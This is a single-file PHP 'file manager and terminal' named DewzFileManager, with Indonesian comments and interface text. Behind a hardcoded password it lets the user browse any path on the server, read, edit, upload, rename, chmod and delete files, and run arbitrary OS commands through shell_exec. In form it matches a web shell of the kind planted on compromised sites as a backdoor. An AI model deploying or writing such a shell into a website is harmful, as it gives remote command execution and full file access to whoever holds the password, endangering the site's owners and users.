<?php
/**
 * DewzFileManager & Terminal Lite (Single File)
 * Fitur: Proteksi Password, Create Folder/File, Upload, View, Edit, Rename, Chmod, Delete, Terminal, Clickable Breadcrumbs.
 */

// Memulai session untuk mendeteksi status login
session_start();

// Konfigurasi Password Keamanan
define('PASSWORD', 'dewzqq');

// Menangani Aksi Logout jika ada parameter ?logout=1
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Menangani Form Login POST
$login_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === PASSWORD) {
        $_SESSION['logged_in'] = true;
        header('Location: ?');
        exit;
    } else {
        $login_error = 'Password salah! Silakan coba lagi.';
    }
}

// Tampilkan Form Login jika user belum masuk secara sah
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true): ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - DewzFileManager</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #1a1e21; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #f8f9fa; }
        .login-card { background: #2c3237; border: 1px solid #3c4349; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); width: 100%; max-width: 360px; text-align: center; }
        .brand-icon { background: #17a2b8; color: #fff; display: inline-block; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 18px; margin-bottom: 15px; }
        h2 { margin: 0 0 10px 0; font-size: 22px; font-weight: 500; color: #fff; }
        p { color: #9da5ac; font-size: 14px; margin: 0 0 25px 0; }
        .input-group { margin-bottom: 20px; text-align: left; }
        input[type="password"] { width: 100%; padding: 12px; background: #1a1e21; border: 1px solid #495057; border-radius: 6px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
        input[type="password"]:focus { border-color: #17a2b8; }
        .btn-login { width: 100%; padding: 12px; background: #17a2b8; border: none; border-radius: 6px; color: white; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn-login:hover { background: #138496; }
        .error-msg { background: #e63946; color: #fff; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="brand-icon">DF</div>
        <h2>DewzFileManager</h2>
        <p>Masukkan password untuk mengakses file manager</p>
        
        <?php if ($login_error): ?>
            <div class="error-msg"><?= htmlspecialchars($login_error) ?></div>
        <?php endif; ?>

        <form method="POST">
            <div class="input-group">
                <input type="password" name="login_password" placeholder="Password Sistem" required autofocus autocomplete="off">
            </div>
            <button type="submit" class="btn-login">Masuk ke Dashboard</button>
        </form>
    </div>
</body>
</html>
<?php 
exit; // Menghentikan eksekusi script file manager di bawahnya jika belum login
endif;

// --- DARI SINI ADALAH AREA KODE SETELAH USER BERHASIL LOGIN ---
$script_home_dir = realpath(dirname(__FILE__));
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $script_home_dir;
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $script_home_dir;
}

$message = '';
$status_type = 'success';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // 1. Buat Folder
    if ($action === 'create_folder' && !empty($_POST['folder_name'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . $_POST['folder_name'];
        if (!file_exists($target)) {
            mkdir($target, 0755, true);
            $message = "Folder '" . htmlspecialchars($_POST['folder_name']) . "' berhasil dibuat.";
        } else { $message = "Folder sudah ada!"; $status_type = 'danger'; }
    }
    // 2. Buat File
    if ($action === 'create_file' && !empty($_POST['file_name'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . $_POST['file_name'];
        if (!file_exists($target)) {
            file_put_contents($target, '');
            $message = "File '" . htmlspecialchars($_POST['file_name']) . "' berhasil dibuat.";
        } else { $message = "File sudah ada!"; $status_type = 'danger'; }
    }
    // 3. Upload File
    if ($action === 'upload_file' && isset($_FILES['file_to_upload'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['file_to_upload']['name']);
        if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target)) {
            $message = "File '" . htmlspecialchars(basename($_FILES['file_to_upload']['name'])) . "' berhasil diupload.";
        } else { $message = "Gagal mengupload file."; $status_type = 'danger'; }
    }
    // 4. Edit File
    if ($action === 'edit_file' && isset($_POST['file_path'])) {
        $target = $_POST['file_path'];
        if (file_exists($target) && is_writable($target)) {
            file_put_contents($target, $_POST['content']);
            $message = "Perubahan file '" . htmlspecialchars(basename($target)) . "' berhasil disimpan.";
        } else { $message = "Gagal menyimpan file."; $status_type = 'danger'; }
    }
    // 5. Rename
    if ($action === 'rename' && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $old_target = $current_dir . DIRECTORY_SEPARATOR . $_POST['old_name'];
        $new_target = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
        if (file_exists($old_target)) {
            rename($old_target, $new_target);
            $message = "Nama berhasil diubah.";
        }
    }
    // 6. Chmod
    if ($action === 'chmod' && !empty($_POST['target_name']) && !empty($_POST['permission'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . $_POST['target_name'];
        if (file_exists($target)) {
            chmod($target, octdec($_POST['permission']));
            $message = "Permission berhasil diubah.";
        }
    }
    // 7. Delete
    if ($action === 'delete' && !empty($_POST['target_name'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . $_POST['target_name'];
        if (file_exists($target)) {
            is_dir($target) ? rmdir($target) : unlink($target);
            $message = "'" . htmlspecialchars($_POST['target_name']) . "' berhasil dihapus.";
        }
    }
    // 8. Terminal Mode
    if ($action === 'terminal' && !empty($_POST['cmd'])) {
        chdir($current_dir);
        $terminal_output = shell_exec($_POST['cmd'] . " 2>&1");
    }
}
$items = scandir($current_dir);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dewz File Manager</title>
    <style>
        :root {
            --primary: #17a2b8;
            --dark-nav: #2c3e50;
            --bg-light: #f8f9fa;
            --border-color: #dee2e6;
        }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background: var(--bg-light); margin: 0; padding: 0; color: #333; }
        
        .navbar { background: var(--dark-nav); color: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .navbar .nav-link { color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px; }
        .navbar .nav-link:hover .brand-title { text-decoration: underline; }
        .navbar h1 { margin: 0; font-size: 18px; font-weight: 500; display: flex; align-items: center; gap: 8px; }
        .navbar .brand-icon { background: var(--primary); padding: 4px 8px; border-radius: 4px; font-size: 14px; font-weight: bold; }
        .btn-logout { background: #dc3545; color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: 600; }
        .btn-logout:hover { background: #c82333; }
        
        .main-wrapper { max-width: 1300px; margin: 20px auto; padding: 0 15px; }
        .breadcrumb-container { background: #fff; border: 1px solid var(--border-color); border-radius: 4px; padding: 10px 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; }
        .path-link { color: #007bff; font-weight: 500; text-decoration: none; }
        .path-link:hover { text-decoration: underline; }
        .btn-up { background: #6c757d; color: white; padding: 4px 10px; border-radius: 4px; text-decoration: none; font-size: 12px; }
        .btn-up:hover { background: #5a6268; }
        .alert { padding: 12px; margin-bottom: 15px; border-radius: 4px; font-size: 14px; }
        .alert-success { background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
        .alert-danger { background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
        .toolbar { background: #fff; border: 1px solid var(--border-color); border-radius: 4px; padding: 15px; margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 20px; }
        .toolbar-section { display: flex; align-items: center; gap: 8px; border-right: 1px solid #eee; padding-right: 20px; }
        .toolbar-section:last-child { border-right: none; }
        .toolbar-section label { font-size: 13px; font-weight: bold; color: #6c757d; text-transform: uppercase; }
        input[type="text"], input[type="file"] { padding: 6px 10px; border: 1px solid #ced4da; border-radius: 4px; font-size: 13px; outline: none; }
        input[type="text"]:focus { border-color: var(--primary); }
        button, .btn-action { padding: 6px 12px; font-size: 13px; border-radius: 4px; border: 1px solid transparent; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; text-decoration: none; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-primary:hover { background: #138496; }
        .btn-sm { padding: 2px 6px; font-size: 11px; }
        .table-container { background: #fff; border: 1px solid var(--border-color); border-radius: 4px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
        th { background: #f1f3f5; color: #495057; font-weight: 600; padding: 12px; border-bottom: 2px solid var(--border-color); }
        td { padding: 10px 12px; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
        tr:hover { background: #f8f9fa; }
        .item-name { display: flex; align-items: center; gap: 8px; text-decoration: none; color: #007bff; font-weight: 500; }
        .item-name.file { color: #333; pointer-events: none; }
        .inline-form { display: inline-flex; align-items: center; gap: 4px; margin: 0; }
        .inline-form input[type="text"] { padding: 3px 6px; font-size: 12px; }
        .panel-container { background: #fff; border: 1px solid var(--border-color); border-radius: 4px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .panel-container h3 { margin-top: 0; font-size: 16px; color: #495057; }
        .panel-container textarea, .panel-container pre { width: 100%; height: 350px; font-family: "SFMono-Regular", Consolas, monospace; font-size: 13px; padding: 10px; box-sizing: border-box; border: 1px solid var(--border-color); border-radius: 4px; margin-bottom: 10px; background: #fafafa; }
        .panel-container pre { overflow: auto; white-space: pre-wrap; margin: 0 0 10px 0; background: #f1f3f5; color: #212529; }
        .terminal-container { background: #111; color: #00ff00; border-radius: 4px; padding: 20px; font-family: "SFMono-Regular", Consolas, monospace; box-shadow: inset 0 0 10px #000; margin-top: 25px; }
        .terminal-container h3 { margin-top: 0; font-size: 15px; color: #fff; border-bottom: 1px solid #333; padding-bottom: 8px; }
        .terminal-output { background: transparent; color: #0f0; padding: 10px 0; max-height: 250px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
        .terminal-input-group { display: flex; align-items: center; gap: 8px; background: #222; padding: 5px 10px; border-radius: 4px; margin-top: 10px; }
        .terminal-prompt { color: #17a2b8; font-weight: bold; font-size: 13px; }
        .terminal-input { flex: 1; background: transparent; border: none; color: #fff; font-family: monospace; font-size: 13px; outline: none; }
    </style>
</head>
<body>

<div class="navbar">
    <h1>
        <a href="?dir=<?= urlencode($script_home_dir) ?>" class="nav-link" title="Kembali ke Direktori Awal Script">
            <span class="brand-icon">DF</span> 
            <span class="brand-title">DewzFileManager</span>
            <span style="font-size: 13px; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 3px; font-weight: normal; margin-left: 5px;">🏠 Home</span>
        </a>
    </h1>
    <a href="?logout=1" class="btn-logout" onclick="return confirm('Apakah Anda yakin ingin keluar?');">Logout 🚪</a>
</div>

<div class="main-wrapper">

    <?php if ($message): ?>
        <div class="alert alert-<?= $status_type ?>"><?= htmlspecialchars($message) ?></div>
    <?php endif; ?>

    <div class="breadcrumb-container">
        <div>
            <span style="color: #888; margin-right: 5px;">Lokasi:</span> 
            <?php 
            $clean_path = str_replace('\\', '/', $current_dir);
            $parts = explode('/', $clean_path);
            $accumulated_path = '';
            
            if (empty($parts) && count($parts) > 1) { echo '<a href="?dir=' . urlencode('/') . '" class="path-link">Root</a>'; }

            foreach ($parts as $index => $part) {
                if (empty($part)) continue;
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && $index === 0) { $accumulated_path .= $part; } 
                else { $accumulated_path .= '/' . $part; }
                echo ' <span style="color: #ccc;">/</span> ';
                if ($index === count($parts) - 1) { echo '<span style="color: #212529; font-weight: 600;">' . htmlspecialchars($part) . '</span>'; } 
                else { echo '<a href="?dir=' . urlencode($accumulated_path) . '" class="path-link">' . htmlspecialchars($part) . '</a>'; }
            }
            ?>
        </div>
        <?php if ($current_dir !== realpath('/')): ?>
            <a href="?dir=<?= urlencode(dirname($current_dir)) ?>" class="btn-up">🔼 Naik Satu Tingkat</a>
        <?php endif; ?>
    </div>

    <div class="toolbar">
        <div class="toolbar-section">
            <label>Folder</label>
            <form method="POST" class="inline-form">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="folder_name" placeholder="Nama folder baru" required>
                <button type="submit" class="btn-primary">➕</button>
            </form>
        </div>
        <div class="toolbar-section">
            <label>File</label>
            <form method="POST" class="inline-form">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="file_name" placeholder="nama_file.txt" required>
                <button type="submit" class="btn-primary">➕</button>
            </form>
        </div>
        <div class="toolbar-section">
            <label>Upload</label>
            <form method="POST" enctype="multipart/form-data" class="inline-form">
                <input type="hidden" name="action" value="upload_file">
                <input type="file" name="file_to_upload" required style="width: 180px;">
                <button type="submit" class="btn-primary">Upload</button>
            </form>
        </div>
    </div>

    <?php if (isset($_GET['view']) && file_exists($_GET['view'])): 
        $view_path = realpath($_GET['view']);
        $file_content = file_get_contents($view_path);
    ?>
        <div class="panel-container" style="border-left: 5px solid #17a2b8;">
            <h3>🔍 Melihat Isi File: <strong><?= htmlspecialchars(basename($view_path)) ?></strong></h3>
            <pre><?= htmlspecialchars($file_content) ?></pre>
            <div>
                <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($view_path) ?>" class="btn-action" style="background:#28a745; color:#fff;">✏️ Beralih ke Edit</a>
                <a href="?dir=<?= urlencode($current_dir) ?>" class="btn-action" style="background:#6c757d; color:#fff;">❌ Tutup Preview</a>
            </div>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['edit']) && file_exists($_GET['edit'])): 
        $edit_path = realpath($_GET['edit']);
        $file_content = file_get_contents($edit_path);
    ?>
        <div class="panel-container" style="border-left: 5px solid #28a745;">
            <h3>📝 Mengedit: <strong><?= htmlspecialchars(basename($edit_path)) ?></strong></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit_file">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_path) ?>">
                <textarea name="content"><?= htmlspecialchars($file_content) ?></textarea>
                <div>
                    <button type="submit" class="btn-primary" style="background:#28a745;">Simpan Perubahan</button>
                    <a href="?dir=<?= urlencode($current_dir) ?>" class="btn-action" style="background:#6c757d; color:#fff;">Batal</a>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Nama Item</th>
                    <th style="width: 80px;">Tipe</th>
                    <th style="width: 140px;">Chmod</th>
                    <th style="width: 120px;">Ukuran</th>
                    <th style="width: 360px; text-align: center;">Aksi</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                foreach ($items as $item): 
                    if ($item === '.' || $item === '..') continue;
                    $item_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                    $is_directory = is_dir($item_path);
                    $perms = substr(sprintf('%o', fileperms($item_path)), -4);
                    $size = $is_directory ? '-' : round(filesize($item_path) / 1024, 2) . ' KB';
                ?>
                <tr>
                    <td>
                        <?php if ($is_directory): ?>
                            <a href="?dir=<?= urlencode($item_path) ?>" class="item-name">📁 <?= htmlspecialchars($item) ?></a>
                        <?php else: ?>
                            <span class="item-name file">📄 <?= htmlspecialchars($item) ?></span>
                        <?php endif; ?>
                    </td>
                    <td><span style="color: #6c757d; font-size: 12px;"><?= $is_directory ? 'Folder' : 'File' ?></span></td>
                    <td>
                        <form method="POST" class="inline-form">
                            <input type="hidden" name="action" value="chmod">
                            <input type="hidden" name="target_name" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="permission" value="<?= $perms ?>" style="width: 40px; text-align:center; padding: 2px;">
                            <button type="submit" class="btn-primary btn-sm">Set</button>
                        </form>
                    </td>
                    <td><span style="font-size: 13px; color: #495057;"><?= $size ?></span></td>
                    <td style="text-align: center;">
                        <div style="display: flex; gap: 6px; justify-content: center; align-items: center;">
                            <?php if (!$is_directory): ?>
                                <a href="?dir=<?= urlencode($current_dir) ?>&view=<?= urlencode($item_path) ?>" class="btn-action btn-sm" style="background:#17a2b8; color:#fff;">Lihat</a>
                                <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($item_path) ?>" class="btn-action btn-sm" style="background:#28a745; color:#fff;">Edit</a>
                            <?php else: ?>
                                <div style="width: 86px;"></div>
                            <?php endif; ?>

                            <form method="POST" class="inline-form">
                                <input type="hidden" name="action" value="rename">
                                <input type="hidden" name="old_name" value="<?= htmlspecialchars($item) ?>">
                                <input type="text" name="new_name" placeholder="Ganti nama" required style="width: 90px;">
                                <button type="submit" class="btn-action btn-sm" style="background:#ffc107; color:#212529;">Ubah</button>
                            </form>

                            <form method="POST" class="inline-form" onsubmit="return confirm('Hapus item ini secara permanen?');">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target_name" value="<?= htmlspecialchars($item) ?>">
                                <button type="submit" class="btn-action btn-sm" style="background:#dc3545; color:#fff;">Hapus</button>
                            </form>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="terminal-container">
        <h3>💻 Terminal Console</h3>
        <?php if (isset($terminal_output)): ?>
            <div class="terminal-output"><?= htmlspecialchars($terminal_output) ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="hidden" name="action" value="terminal">
            <div class="terminal-input-group">
                <span class="terminal-prompt">shell_exec:~$</span>
                <input type="text" name="cmd" class="terminal-input" placeholder="Ketik perintah lalu Enter" required autocomplete="off">
            </div>
        </form>
    </div>

</div>
</body>
</html>
